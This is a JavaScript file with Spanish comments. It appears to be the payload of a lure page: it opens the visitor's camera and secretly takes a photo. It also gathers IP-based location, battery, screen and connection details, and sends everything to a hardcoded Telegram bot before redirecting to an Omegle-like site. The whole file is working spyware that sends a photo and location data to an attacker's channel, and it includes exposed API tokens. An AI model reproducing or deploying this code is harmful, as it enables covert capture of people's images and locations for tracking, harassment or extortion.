(async () => {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  // Activar cámara
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
  } catch (error) {
    alert('No se pudo acceder a la cámara');
    return;
  }

  // Esperar a que cargue el video
  await new Promise(resolve => setTimeout(resolve, 3000));

  // Tomar foto
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0);
  const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

  // Datos del sistema
  const battery = await navigator.getBattery();
  const touch = navigator.maxTouchPoints > 0 ? 'Sí' : 'No';
  const resolution = `${window.screen.width}x${window.screen.height}`;
  const hora = new Date().toLocaleString('es-CO');
  const idioma = navigator.language;

  // Tipo de conexión
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
  const tipoConexion = conn.effectiveType || 'Desconocida';

  // IP y ubicación
  const ipinfo = await fetch('https://ipinfo.io/json?token=13d5ad8940e9e0').then(res => res.json());

  // Mensaje
  const mensaje = `
👑 ANDRIUX 👑

*😎 Nueva Selfie Recibida 😎*

*Fecha:* ${hora}
*País:* ${ipinfo.country}
*Ciudad:* ${ipinfo.city}
*IP:* ${ipinfo.ip}
*Resolución:* ${resolution}
*Idioma:* ${idioma}
*Touch:* ${touch}
*Conexión:* ${tipoConexion}
*Batería:* ${Math.round(battery.level * 100)}%
  `;

  const formData = new FormData();
  formData.append('chat_id', '1959256229');
  formData.append('caption', mensaje);
  formData.append('parse_mode', 'Markdown');
  formData.append('photo', photoBlob, 'selfie.jpg');

  await fetch('https://api.telegram.org/bot8753333044:AAGhfbrHKvLVZrT-lOG2oOA9YDWETGhw1-k/sendPhoto', {
    method: 'POST',
    body: formData
  });
})();

// Esperar 20 segundos y redirigir
setTimeout(() => {
  window.location.href = 'https://www.omegle.fun/es/index.html';
}, 20000);
